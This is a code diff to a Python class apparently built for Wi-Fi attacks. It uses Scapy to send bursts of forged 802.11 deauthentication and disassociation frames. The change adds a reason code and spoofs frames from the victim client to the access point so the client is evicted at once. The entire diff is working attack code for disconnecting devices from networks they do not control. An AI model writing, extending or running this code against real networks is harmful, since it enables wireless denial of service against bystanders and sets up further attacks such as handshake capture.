@@ -107,12 +107,20 @@ class AdvancedEviction:
         self.decoy_channel = 6 if current_channel == 1 else (1 if current_channel <= 14 else 36)
 
     def send_deauth_burst(self, client_mac: Optional[str] = None, count: int = 3) -> int:
-        """Send standard 802.11 Deauth + Disassoc frame burst."""
+        """Send standard 802.11 Deauth + Disassoc frame burst (bidirectional for clients)."""
         dest = client_mac.lower() if client_mac else "ff:ff:ff:ff:ff:ff"
         frames = [
+            # AP -> Client / Broadcast
             RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth(reason=7),
-            RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Disas(reason=8)
+            RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth(reason=6),
+            RadioTap() / Dot11(addr1=dest, addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Disas(reason=8),
         ]
+        # For unicast client eviction: also spoof Client -> AP so AP evicts the client's session immediately
+        if dest != "ff:ff:ff:ff:ff:ff":
+            frames.extend([
+                RadioTap() / Dot11(addr1=self.target_bssid, addr2=dest, addr3=self.target_bssid) / Dot11Deauth(reason=7),
+                RadioTap() / Dot11(addr1=self.target_bssid, addr2=dest, addr3=self.target_bssid) / Dot11Disas(reason=8),
+            ])
         try:
             sendp(frames, iface=self.interface, count=count, verbose=False)
             return count * len(frames)
